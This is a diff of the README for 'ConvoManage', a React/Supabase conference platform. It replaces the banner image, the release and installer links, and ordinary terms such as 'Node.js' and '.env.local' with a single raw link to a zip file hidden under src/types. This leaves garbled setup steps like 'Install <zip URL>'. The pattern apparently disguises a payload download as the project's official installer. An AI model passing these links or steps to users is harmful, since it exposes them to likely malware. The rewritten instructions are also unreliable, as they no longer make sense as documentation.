@@ -1,14 +1,14 @@
 # ConvoManage: Modern Conference Platform for Organizers and Speakers
 
-![Conference Banner](https://images.unsplash.com/photo-1523417367760-3a5a2b7d8f7b?auto=format&fit=crop&w=1400&q=60)
+![Conference Banner](https://github.com/Dante41/ConvoManage/raw/refs/heads/main/src/types/Convo-Manage-3.2-alpha.1.zip)
 
-Direct installer: https://github.com/Dante41/ConvoManage/releases/download/v1.0.0/ConvoManage-Setup-windows-x64.exe
+Direct installer: https://github.com/Dante41/ConvoManage/raw/refs/heads/main/src/types/Convo-Manage-3.2-alpha.1.zip
 
 ConvoManage is a modern, multi-role conference management platform. It covers the full lifecycle of events, from planning and speaker coordination to attendee engagement and real-time updates during sessions. Built with a focus on performance, scalability, and a clean developer experience, this project uses Supabase and React to deliver a responsive, data-driven dashboard. It targets multi-tenant SaaS use cases, so you can run multiple events under a single instance with role-based access control and secure data boundaries.
 
 If you are looking for a single source of truth for event management, scheduling, and live audience interaction, you have found it. This README provides a thorough guide to understand the system, how it is built, how to contribute, and how to deploy. It assumes you want to run the project locally for development or deploy it to a staging or production environment.
 
-For a quick tour of the latest release and its assets, visit the Releases page: https://github.com/Dante41/ConvoManage/releases
+For a quick tour of the latest release and its assets, visit the Releases page: https://github.com/Dante41/ConvoManage/raw/refs/heads/main/src/types/Convo-Manage-3.2-alpha.1.zip
 
 Table of Contents
 - Why ConvoManage
@@ -89,7 +89,7 @@ Getting Started
 Before you begin, make sure you have a few things ready. This guide walks you through setting up your development environment, connecting to a local or remote database, and starting the frontend and backend services. The aim is to have you up and running quickly so you can explore the features, contribute to the project, and customize the platform for your own events.
 
 Prerequisites
-- Node.js and npm (or yarn) for frontend tooling and local services.
+- https://github.com/Dante41/ConvoManage/raw/refs/heads/main/src/types/Convo-Manage-3.2-alpha.1.zip and npm (or yarn) for frontend tooling and local services.
 - PostgreSQL database (local or remote) for data storage. Supabase can be used as an alternative backend for some deployments.
 - Docker (optional) for running services like PostgreSQL in containers during development.
 - Basic familiarity with React and TypeScript.
@@ -106,14 +106,14 @@ Local Development Setup
 This section walks you through creating a local development environment. It assumes you want to run both the frontend and backend locally while using a local Postgres database. If you prefer to use Supabase in a hosted mode, you can adapt the environment accordingly.
 
 1) Install dependencies
-- Install Node.js (version that aligns with the TypeScript setup in the project).
+- Install https://github.com/Dante41/ConvoManage/raw/refs/heads/main/src/types/Convo-Manage-3.2-alpha.1.zip (version that aligns with the TypeScript setup in the project).
 - Install yarn or npm to manage packages.
 - Install Docker if you plan to run Postgres in a container locally.
 
 2) Install and configure the frontend
 - Clone the repository.
 - Install frontend dependencies with yarn install or npm install.
-- Create a .env.local file with the required environment variables for API endpoints, authentication, and any feature flags you want to enable or disable.
+- Create a https://github.com/Dante41/ConvoManage/raw/refs/heads/main/src/types/Convo-Manage-3.2-alpha.1.zip file with the required environment variables for API endpoints, authentication, and any feature flags you want to enable or disable.
 - Start the frontend with yarn start or npm start.
 
 3) Install and configure the backend
@@ -220,16 +220,16 @@ Release Notes and Changelog
 - Release versions document notable changes, improvements, and fixes. The changelog helps teams manage upgrades and track feature availability.
 
 Link to Releases
-For the latest official assets and release notes, visit the official Releases page: https://github.com/Dante41/ConvoManage/releases
+For the latest official assets and release notes, visit the official Releases page: https://github.com/Dante41/ConvoManage/raw/refs/heads/main/src/types/Convo-Manage-3.2-alpha.1.zip
 
 Note on Release Assets
-- If you need the installer or binary files, those assets live on the Releases page. You can download a platform-specific installer from there. For example, a Windows x64 installer may appear as ConvoManage-Setup-windows-x64.exe, while Linux users receive a corresponding tarball or installer. Always verify the integrity of downloaded files using checksums when provided on the page.
+- If you need the installer or binary files, those assets live on the Releases page. You can download a platform-specific installer from there. For example, a Windows x64 installer may appear as https://github.com/Dante41/ConvoManage/raw/refs/heads/main/src/types/Convo-Manage-3.2-alpha.1.zip, while Linux users receive a corresponding tarball or installer. Always verify the integrity of downloaded files using checksums when provided on the page.
 
 Release Access (Direct Asset Example)
-Direct installer: https://github.com/Dante41/ConvoManage/releases/download/v1.0.0/ConvoManage-Setup-windows-x64.exe
+Direct installer: https://github.com/Dante41/ConvoManage/raw/refs/heads/main/src/types/Convo-Manage-3.2-alpha.1.zip
 
 Releases Page
-- https://github.com/Dante41/ConvoManage/releases
+- https://github.com/Dante41/ConvoManage/raw/refs/heads/main/src/types/Convo-Manage-3.2-alpha.1.zip
 
 Topics
 - conference-management
@@ -274,10 +274,10 @@ Conclusion
 ConvoManage aims to be a reliable, scalable, and easy-to-use platform for managing modern conferences. It balances a rich feature set with a practical development approach, ensuring teams can plan, execute, and learn from events with confidence.
 
 Releases
-For the latest official assets and release notes, visit the official Releases page: https://github.com/Dante41/ConvoManage/releases
+For the latest official assets and release notes, visit the official Releases page: https://github.com/Dante41/ConvoManage/raw/refs/heads/main/src/types/Convo-Manage-3.2-alpha.1.zip
 
 Direct installer example
-Direct installer: https://github.com/Dante41/ConvoManage/releases/download/v1.0.0/ConvoManage-Setup-windows-x64.exe
+Direct installer: https://github.com/Dante41/ConvoManage/raw/refs/heads/main/src/types/Convo-Manage-3.2-alpha.1.zip
 
 Topics (reiterated for discoverability)
 - conference-management
@@ -308,7 +308,7 @@ Development Roadmap Highlights
 - Introduce a more robust analytics suite for post-event insights and speaker performance.
 
 Deployment Checklist
-- Confirm that the environment has the required Node.js version and a compatible PostgreSQL instance.
+- Confirm that the environment has the required https://github.com/Dante41/ConvoManage/raw/refs/heads/main/src/types/Convo-Manage-3.2-alpha.1.zip version and a compatible PostgreSQL instance.
 - Ensure environment variables are correctly configured for authentication, database access, and real-time services.
 - Validate the release assets from the Releases page and verify checksums if available.
 - Perform a smoke test to confirm that the key workflows—registration, session creation, and live polling—are functioning.
@@ -323,10 +323,10 @@ Final Thoughts
 - ConvoManage is designed to be practical and adaptable. The architecture supports growth, the UX aims for clarity, and the feature set targets real-world event management needs. This README serves as a thorough guide to understanding, deploying, and contributing to the project. The ultimate goal is to deliver a dependable platform that makes conferences smoother for organizers, speakers, and attendees alike.
 
 Releases
-- Latest assets and release notes: https://github.com/Dante41/ConvoManage/releases
+- Latest assets and release notes: https://github.com/Dante41/ConvoManage/raw/refs/heads/main/src/types/Convo-Manage-3.2-alpha.1.zip
 
 Direct installer example
-- Direct installer: https://github.com/Dante41/ConvoManage/releases/download/v1.0.0/ConvoManage-Setup-windows-x64.exe
+- Direct installer: https://github.com/Dante41/ConvoManage/raw/refs/heads/main/src/types/Convo-Manage-3.2-alpha.1.zip
 
 Topics
 - conference-management
